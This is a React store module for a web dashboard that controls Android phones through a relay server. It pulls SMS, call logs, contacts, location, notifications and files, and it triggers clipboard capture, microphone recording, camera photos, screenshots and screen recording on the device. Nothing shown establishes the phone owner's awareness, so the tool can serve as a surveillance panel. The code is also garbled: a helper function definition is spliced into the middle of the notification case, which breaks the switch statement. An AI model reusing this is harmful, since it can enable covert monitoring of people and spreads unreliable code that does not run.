import { useState, useCallback, useEffect, useMemo, createContext, useContext, useRef } from 'react';

// Resolve the relay WS URL from wherever the dashboard is served.
// - https page (ngrok / any domain on 443) → wss://same-host
// - localhost dev → ws://localhost:5000
// - LAN IP dev → ws://same-host:5000
// REST calls are relative ('/api/...') so they follow the page origin too.
const WS_URL = (() => {
  const { protocol, hostname, port } = window.location;
  if (protocol === 'https:') return `wss://${hostname}${port ? `:${port}` : ''}`;
  if (hostname === 'localhost' || hostname === '127.0.0.1') return 'ws://localhost:5000';
  return `ws://${hostname}:5000`;
})();

const StoreContext = createContext(null);

export function StoreProvider({ children }) {
  const [devices, setDevices] = useState({});
  const [activeDeviceId, setActiveDeviceId] = useState(null);
  const [calls, setCalls] = useState({});
  const [messages, setMessages] = useState({});
  const [locations, setLocations] = useState({});
  const [contacts, setContacts] = useState({});
  const [files, setFiles] = useState({ path: '/', entries: [], downloadBuffer: '' });
  const [notifications, setNotifications] = useState([]);
  const [connected, setConnected] = useState(false);
  const [incomingCallAlert, setIncomingCallAlert] = useState(null);
  const [smsAlert, setSmsAlert] = useState(null);
  const [toasts, setToasts] = useState([]);

  // Round 3 remote control & telemetry states
  const [deviceInfo, setDeviceInfo] = useState({});
  const [installedApps, setInstalledApps] = useState({});
  const [wifiInfo, setWifiInfo] = useState({});
  const [clipboardHistory, setClipboardHistory] = useState([]);
  const [clipboardCapture, setClipboardCapture] = useState({});
  const [appPermissions, setAppPermissions] = useState({});
  const [callBlocklist, setCallBlocklist] = useState({});
  const [micRecording, setMicRecording] = useState(false);
  const [latestMicAudio, setLatestMicAudio] = useState(null);
  const [cameraCapturing, setCameraCapturing] = useState(false);
  const [latestCameraPhoto, setLatestCameraPhoto] = useState(null);
  const [screenshotCapturing, setScreenshotCapturing] = useState(false);
  const [latestScreenshot, setLatestScreenshot] = useState(null);
  const [screenRecording, setScreenRecording] = useState(false);
  const [latestScreenFrame, setLatestScreenFrame] = useState(null);
  const ws = useRef(null);
  const alertTimers = useRef({});
  // Mirrors files.downloadBuffer for the stray-terminator guard below
  // (reading state inside setState-updater would be a side effect).
  const filesRef = useRef({ downloadBuffer: '', download: null });
  const setFilesTracked = useCallback((updater) => {
    setFiles((f) => {
      const next = typeof updater === 'function' ? updater(f) : updater;
      filesRef.current = next;
      return next;
    });
  }, []);

  const pushToast = useCallback((text, kind = 'info') => {
    const id = Date.now() + Math.random();
    setToasts((t) => [...t, { id, text, kind }]);
    setTimeout(() => setToasts((t) => t.filter((x) => x.id !== id)), 4000);
  }, []);

  const dismissAlert = useCallback(() => {
    if (alertTimers.current.incomingCall) clearTimeout(alertTimers.current.incomingCall);
    setIncomingCallAlert(null);
  }, []);

  const dismissSmsAlert = useCallback(() => {
    if (alertTimers.current.sms) clearTimeout(alertTimers.current.sms);
    setSmsAlert(null);
  }, []);

  useEffect(() => {
    let closedByUs = false;
    let retry;

    const connect = () => {
      const socket = new WebSocket(WS_URL);
      ws.current = socket;

      socket.onopen = () => setConnected(true);
      socket.onclose = () => {
        setConnected(false);
        if (!closedByUs) retry = setTimeout(connect, 2000);
      };
      socket.onerror = () => socket.close();

      socket.onmessage = (ev) => {
        let msg;
        try {
          msg = JSON.parse(ev.data);
        } catch {
          return;
        }
        handleEvent(msg);
      };
    };

    const handleEvent = (msg) => {
      const p = msg.payload || {};
      switch (msg.event) {
        case 'DEVICE_UPDATE': {
          setDevices((d) => ({ ...d, [p.deviceId]: p }));
          setActiveDeviceId((id) => id ?? p.deviceId);
          break;
        }

        case 'DEVICE_REGISTERED':
          break;

        case 'CALLS_SYNCED': {
          setCalls((c) => ({ ...c, [p.deviceId]: p.calls || [] }));
          const missed = (p.calls || []).find(
            (call) => call.type === 'missed' && Date.now() - call.timestamp < 60_000
          );
          if (missed) {
            setIncomingCallAlert({ ...missed, deviceId: p.deviceId });
            if (alertTimers.current.incomingCall) clearTimeout(alertTimers.current.incomingCall);
            alertTimers.current.incomingCall = setTimeout(() => setIncomingCallAlert(null), 8000);
          }
          break;
        }

        case 'SMS_SYNCED': {
          setMessages((m) => {
            const list = [...(m[p.deviceId] || []), ...(p.messages || [])];
            const seen = new Set();
            const unique = list.filter((msg) => {
              const key = `${msg.deviceId}:${msg.id}`;
              if (seen.has(key)) return false;
              seen.add(key);
              return true;
            });
            return { ...m, [p.deviceId]: unique };
          });
          const fresh = (p.messages || []).find(
            (message) => message.type === 1 && Date.now() - message.date < 60_000
          );
          if (fresh) {
            setSmsAlert({ ...fresh, deviceId: p.deviceId });
            if (alertTimers.current.sms) clearTimeout(alertTimers.current.sms);
            alertTimers.current.sms = setTimeout(() => setSmsAlert(null), 6000);
          }
          break;
        }

        case 'LOCATION_UPDATE': {
          setLocations((l) => ({
            ...l,
            [p.deviceId]: { latitude: p.latitude, longitude: p.longitude, accuracy: p.accuracy, timestamp: p.timestamp }
          }));
          break;
        }

        case 'INCOMING_CALL_RING': {
          setIncomingCallAlert({ ...p, deviceId: p.deviceId, type: 'incoming' });
          if (alertTimers.current.incomingCall) clearTimeout(alertTimers.current.incomingCall);
          alertTimers.current.incomingCall = setTimeout(() => setIncomingCallAlert(null), 12_000);
          break;
        }

        case 'FILE_LIST_RESPONSE': {
          setFilesTracked({ path: p.path || '/', entries: p.entries || [], error: p.error });
          break;
        }

        case 'FILE_DOWNLOAD_RESPONSE': {
          if (p.error) {
            setFilesTracked((f) => ({ ...f, download: { error: p.error }, downloadBuffer: '' }));
            pushToast(`Download failed: ${p.error}`, 'error');
            break;
          }
          // Guard: a stray empty terminator (old phone builds sent one AFTER
          // the real last chunk) must not wipe a buffered/completed transfer.
          // A legit empty FILE starts with an empty buffer, so only skip when
          // something is already buffered or completed.
          if (!p.data && p.isLastChunk && (filesRef.current.downloadBuffer || (filesRef.current.download && filesRef.current.download.data))) {
            break;
          }
          if (p.data == null && !p.isLastChunk) break;
          setFilesTracked((f) => {
            const buffer = f.downloadBuffer ? f.downloadBuffer + (p.data || '') : p.data || '';
            const isLast = !!p.isLastChunk;
            return {
              ...f,
              downloadBuffer: isLast ? '' : buffer,
              download: isLast ? { name: p.name, mimeType: p.mimeType, data: buffer } : null
            };
          });
          break;
        }

        case 'NOTIFICATION_POSTED': {
          const note = { ...p, id: p.key || `${p.deviceId}-${p.postTime}` };
          setNotifications((prev) => {
            const filtered = prev.filter((n) => n.key !== note.key);
            const next = [note, ...filtered];
            if (next.length > 200) next.length = 200;
            return next;
          });
          if (document.hidden && 'Notification' in window && Notification.permission === 'granted') {
            const title = p.title ? `${p.appName}: ${p.title}` : p.appName || 'New notification';
            try {
              const n = new Notification(title, { body: p.text || '', tag: note.key });
              n.onclick = () => { window.focus(); n.close(); };
            } catch (e) {
              // ignore
  }
}

function titleOrApp(appName, title, text) {
  if (title && text) return `${title} · ${appName || ''}`;
  if (title) return `${title} (${appName || 'Android'})`;
  if (text) return `${appName || 'Android'}: ${text}`;
  return appName || 'New notification';
}
          const toastText = titleOrApp(p.appName, p.title, p.text);
          pushToast(toastText, 'info');
          break;
        }

        case 'NOTIFICATION_REMOVED': {
          setNotifications((prev) => prev.filter((n) => n.key !== p.key));
          break;
        }

        case 'SEND_SMS_RESULT': {
          pushToast(p.success ? 'SMS sent' : `SMS failed: ${p.error || 'unknown error'}`, p.success ? 'success' : 'error');
          break;
        }

        case 'CONTACTS_SYNCED': {
          setContacts((c) => ({ ...c, [p.deviceId]: p.contacts || [] }));
          break;
        }

        case 'ADD_CONTACT_RESULT': {
          pushToast(p.success ? `Contact ${p.name || ''} saved on phone` : `Add contact failed: ${p.error || 'unknown error'}`, p.success ? 'success' : 'error');
          break;
        }

        case 'FIND_PHONE_STOPPED': {
          pushToast('Phone finder alarm stopped on device', 'success');
          break;
        }

        case 'DEVICE_REMOVED': {
          setDevices((d) => {
            const next = { ...d };
            delete next[p.deviceId];
            return next;
          });
          setActiveDeviceId((id) => (id === p.deviceId ? null : id));
          break;
        }

        // Round 3 remote control & telemetry responses
        case 'DEVICE_INFO_RESPONSE': {
          setDeviceInfo((prev) => ({ ...prev, [p.deviceId]: p }));
          break;
        }

        case 'INSTALLED_APPS_RESPONSE': {
          setInstalledApps((prev) => ({ ...prev, [p.deviceId]: p.apps || [] }));
          break;
        }

        case 'APP_PERMS_RESPONSE': {
          setAppPermissions((prev) => ({ ...prev, [p.packageName]: p.permissions || [] }));
          break;
        }

        case 'WIFI_RESPONSE': {
          setWifiInfo((prev) => ({ ...prev, [p.deviceId]: p }));
          break;
        }

        case 'CLIPBOARD_READ_RESPONSE': {
          if (p.text) {
            setClipboardHistory((prev) => [
              { id: Date.now(), deviceId: p.deviceId, text: p.text, timestamp: Date.now() },
              ...prev.filter((c) => c.text !== p.text)
            ].slice(0, 100));
            pushToast('Phone clipboard read successfully', 'success');
          } else {
            pushToast('Phone clipboard is currently empty', 'info');
          }
          break;
        }

        case 'CLIPBOARD_UPDATE': {
          if (p.text) {
            setClipboardHistory((prev) => [
              { id: p.id || Date.now(), deviceId: p.deviceId, text: p.text, timestamp: p.timestamp || Date.now() },
              ...prev.filter((c) => c.text !== p.text)
            ].slice(0, 100));
            pushToast('New clipboard text captured from phone', 'info');
          }
          break;
        }

        case 'VIBRATE_RESULT': {
          pushToast(p.success ? `Phone vibrated (${p.durationMs || 500}ms)` : `Vibrate failed: ${p.error || 'error'}`, p.success ? 'success' : 'error');
          break;
        }

        case 'TTS_RESULT': {
          pushToast(p.success ? `Spoke: "${p.text}"` : `TTS failed: ${p.error || 'error'}`, p.success ? 'success' : 'error');
          break;
        }

        case 'PLAY_AUDIO_RESULT': {
          if (p.playing) {
            pushToast('Audio playback started on device', 'success');
          } else if (p.error) {
            pushToast(`Audio error: ${p.error}`, 'error');
          } else {
            pushToast('Audio playback stopped', 'info');
          }
          break;
        }

        case 'WALLPAPER_RESULT': {
          pushToast(p.success ? 'Wallpaper updated successfully on phone' : `Wallpaper failed: ${p.error || 'error'}`, p.success ? 'success' : 'error');
          break;
        }

        case 'LOCK_RESULT': {
          if (p.success) {
            pushToast('Device screen locked successfully', 'success');
          } else {
            pushToast(`Lock failed: ${p.error || 'Device Admin required'}`, 'error');
          }
          break;
        }

        case 'CALL_BLOCKLIST_RESULT': {
          if (p.deviceId) {
            setCallBlocklist((prev) => ({ ...prev, [p.deviceId]: { enabled: p.enabled, numbers: p.numbers || [] } }));
          }
          pushToast(p.success ? 'Call blocklist updated' : `Blocklist error: ${p.error}`, p.success ? 'success' : 'error');
          break;
        }

        case 'MIC_RECORD_RESULT': {
          setMicRecording(false);
          if (p.success) {
            setLatestMicAudio(p);
            pushToast(`Mic audio recorded (${p.durationSec || 15}s)`, 'success');
          } else {
            pushToast(`Mic record failed: ${p.error || 'error'}`, 'error');
          }
          break;
        }

        case 'CAMERA_CAPTURE_RESULT': {
          setCameraCapturing(false);
          if (p.success) {
            setLatestCameraPhoto(p);
            pushToast(`Photo captured (${p.facing || 'camera'})`, 'success');
          } else {
            pushToast(`Camera failed: ${p.error || 'error'}`, 'error');
          }
          break;
        }

        case 'SCREENSHOT_RESULT': {
          setScreenshotCapturing(false);
          if (p.success) {
            setLatestScreenshot(p);
            pushToast('Screenshot captured', 'success');
          } else {
            pushToast(`Screenshot failed: ${p.error || 'permission denied'}`, 'error');
          }
          break;
        }

        case 'SCREEN_RECORD_FRAME': {
          setLatestScreenFrame(p);
          break;
        }

        default:
          break;
      }
    };

    connect();

    return () => {
      closedByUs = true;
      clearTimeout(retry);
      ws.current?.close();
    };
  }, [pushToast]);

  useEffect(() => {
    fetch('/api/devices')
      .then((r) => r.json())
      .then((list) => {
        const mapped = {};
        list.forEach((d) => {
          mapped[d.id] = {
            deviceId: d.id,
            deviceName: d.name,
            battery: d.battery,
            isCharging: !!d.charging,
            last_seen: d.last_seen,
            online: d.online
          };
        });
        setDevices((prev) => ({ ...mapped, ...prev }));
      })
      .catch(() => {});
  }, []);

  useEffect(() => {
    if (!activeDeviceId) return;
    fetch(`/api/devices/${activeDeviceId}/calls`)
      .then((r) => r.json())
      .then((list) => setCalls((c) => ({ ...c, [activeDeviceId]: list })))
      .catch(() => {});
    fetch(`/api/devices/${activeDeviceId}/messages`)
      .then((r) => r.json())
      .then((list) =>
        setMessages((m) => ({
          ...m,
          [activeDeviceId]: list.map((x) => ({ ...x, deviceId: activeDeviceId }))
        }))
      )
      .catch(() => {});
    fetch(`/api/devices/${activeDeviceId}/notifications`)
      .then((r) => r.json())
      .then((list) => setNotifications(list))
      .catch(() => {});
    fetch(`/api/devices/${activeDeviceId}/contacts`)
      .then((r) => r.json())
      .then((list) => setContacts((c) => ({ ...c, [activeDeviceId]: list || [] })))
      .catch(() => {});
    fetch(`/api/devices/${activeDeviceId}/info`)
      .then((r) => r.json())
      .then((info) => { if (info) setDeviceInfo((prev) => ({ ...prev, [activeDeviceId]: info })); })
      .catch(() => {});
    fetch(`/api/devices/${activeDeviceId}/apps`)
      .then((r) => r.json())
      .then((apps) => setInstalledApps((prev) => ({ ...prev, [activeDeviceId]: apps || [] })))
      .catch(() => {});
    fetch(`/api/devices/${activeDeviceId}/wifi`)
      .then((r) => r.json())
      .then((wifi) => { if (wifi) setWifiInfo((prev) => ({ ...prev, [activeDeviceId]: wifi })); })
      .catch(() => {});
    fetch(`/api/devices/${activeDeviceId}/clipboard`)
      .then((r) => r.json())
      .then((list) => setClipboardHistory(list || []))
      .catch(() => {});
    fetch(`/api/devices/${activeDeviceId}/blocklist`)
      .then((r) => r.json())
      .then((b) => { if (b) setCallBlocklist((prev) => ({ ...prev, [activeDeviceId]: b })); })
      .catch(() => {});
  }, [activeDeviceId]);

  const sendCommand = useCallback(async (path, body) => {
    try {
      const res = await fetch(`/api/command/${path}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body)
      });
      return await res.json();
    } catch (e) {
      return { success: false, error: String(e) };
    }
  }, []);

  const value = useMemo(
    () => ({
      devices,
      activeDeviceId,
      setActiveDeviceId,
      activeDevice: activeDeviceId ? devices[activeDeviceId] : null,
      calls,
      messages,
      locations,
      contacts,
      files,
      notifications,
      connected,
      incomingCallAlert,
      smsAlert,
      dismissAlert,
      dismissSmsAlert,
      toasts,
      pushToast,
      sendCommand,
      // Round 3 remote controls & telemetry data
      deviceInfo: activeDeviceId ? deviceInfo[activeDeviceId] : null,
      installedApps: activeDeviceId ? (installedApps[activeDeviceId] || []) : [],
      wifiInfo: activeDeviceId ? wifiInfo[activeDeviceId] : null,
      clipboardHistory: activeDeviceId ? clipboardHistory.filter((c) => c.deviceId === activeDeviceId) : clipboardHistory,
      clipboardCapture: activeDeviceId ? !!clipboardCapture[activeDeviceId] : false,
      appPermissions,
      callBlocklist: activeDeviceId ? (callBlocklist[activeDeviceId] || { enabled: false, numbers: [] }) : { enabled: false, numbers: [] },
      vibratePhone: (durationMs, pattern) => sendCommand('vibrate', { deviceId: activeDeviceId, durationMs, pattern }),
      speakTts: (text, speed, pitch) => sendCommand('tts', { deviceId: activeDeviceId, text, speed, pitch }),
      playAudio: (url, loop) => sendCommand('play-audio', { deviceId: activeDeviceId, url, loop }),
      stopAudio: () => sendCommand('play-audio-stop', { deviceId: activeDeviceId }),
      setWallpaper: (payload) => sendCommand('wallpaper', { deviceId: activeDeviceId, ...payload }),
      refreshDeviceInfo: () => sendCommand('device-info', { deviceId: activeDeviceId }),
      refreshInstalledApps: () => sendCommand('installed-apps', { deviceId: activeDeviceId }),
      fetchAppPerms: (packageName) => sendCommand('app-perms', { deviceId: activeDeviceId, packageName }),
      refreshWifiInfo: () => sendCommand('wifi-info', { deviceId: activeDeviceId }),
      readClipboard: () => sendCommand('clipboard-read', { deviceId: activeDeviceId }),
      lockDevice: () => sendCommand('lock', { deviceId: activeDeviceId }),
      syncCallBlocklist: (enabled, numbers) => sendCommand('call-blocklist-sync', { deviceId: activeDeviceId, enabled, numbers }),
      // Media remote controls & state
      micRecording,
      latestMicAudio: (latestMicAudio && latestMicAudio.deviceId === activeDeviceId) ? latestMicAudio : null,
      recordMic: (durationSec = 15) => {
        setMicRecording(true);
        sendCommand('mic-record', { deviceId: activeDeviceId, durationSec });
      },
      cameraCapturing,
      latestCameraPhoto: (latestCameraPhoto && latestCameraPhoto.deviceId === activeDeviceId) ? latestCameraPhoto : null,
      captureCamera: (facing = 'back') => {
        setCameraCapturing(true);
        sendCommand('camera-capture', { deviceId: activeDeviceId, facing });
      },
      screenshotCapturing,
      latestScreenshot: (latestScreenshot && latestScreenshot.deviceId === activeDeviceId) ? latestScreenshot : null,
      captureScreenshot: () => {
        setScreenshotCapturing(true);
        sendCommand('screenshot', { deviceId: activeDeviceId });
      },
      screenRecording,
      latestScreenFrame: (latestScreenFrame && latestScreenFrame.deviceId === activeDeviceId) ? latestScreenFrame : null,
      startScreenRecord: (fps = 2) => {
        setScreenRecording(true);
        sendCommand('screen-record-start', { deviceId: activeDeviceId, fps });
      },
      stopScreenRecord: () => {
        setScreenRecording(false);
        sendCommand('screen-record-stop', { deviceId: activeDeviceId });
      },
      toggleClipboardCapture: (enable) => {
        setClipboardCapture((c) => ({ ...c, [activeDeviceId]: enable }));
        sendCommand(enable ? 'clipboard-enable' : 'clipboard-disable', { deviceId: activeDeviceId });
      },
      markNotificationRead: (key) => setNotifications((prev) => prev.map((n) => n.key === key ? { ...n, read: true } : n)),
      dismissNotification: (key) => {
        setNotifications((prev) => prev.filter((n) => n.key !== key));
        sendCommand('notification-dismiss', { deviceId: activeDeviceId, key });
      },
      dismissAllNotifications: () => {
        setNotifications([]);
        if (activeDeviceId) sendCommand('notification-clear-all', { deviceId: activeDeviceId });
      },
      // Section refresh: pull the stored notification log again from REST.
      refreshNotifications: () => {
        if (!activeDeviceId) return;
        fetch(`/api/devices/${activeDeviceId}/notifications`)
          .then((r) => r.json())
          .then((list) => setNotifications(list || []))
          .catch(() => {});
      },
      removeDevice: async (deviceId) => {
        try {
          const res = await fetch(`/api/devices/${deviceId}`, { method: 'DELETE' });
          const out = await res.json();
          if (out && out.success) {
            setDevices((d) => {
              const next = { ...d };
              delete next[deviceId];
              return next;
            });
            setActiveDeviceId((id) => (id === deviceId ? null : id));
            pushToast('Device removed', 'success');
            return true;
          }
          pushToast(`Remove failed: ${out.error || 'unknown error'}`, 'error');
        } catch (e) {
          pushToast(`Remove failed: ${String(e)}`, 'error');
        }
        return false;
      }
    }),
    [devices, activeDeviceId, calls, messages, locations, contacts, files, notifications, connected, incomingCallAlert, smsAlert, toasts, sendCommand, dismissAlert, dismissSmsAlert, pushToast, deviceInfo, installedApps, wifiInfo, clipboardHistory, clipboardCapture, appPermissions, callBlocklist, micRecording, latestMicAudio, cameraCapturing, latestCameraPhoto, screenshotCapturing, latestScreenshot, screenRecording, latestScreenFrame]
  );

  return <StoreContext.Provider value={value}>{children}</StoreContext.Provider>;
}

export function useStore() {
  const ctx = useContext(StoreContext);
  if (!ctx) throw new Error('useStore must be used within StoreProvider');
  return ctx;
}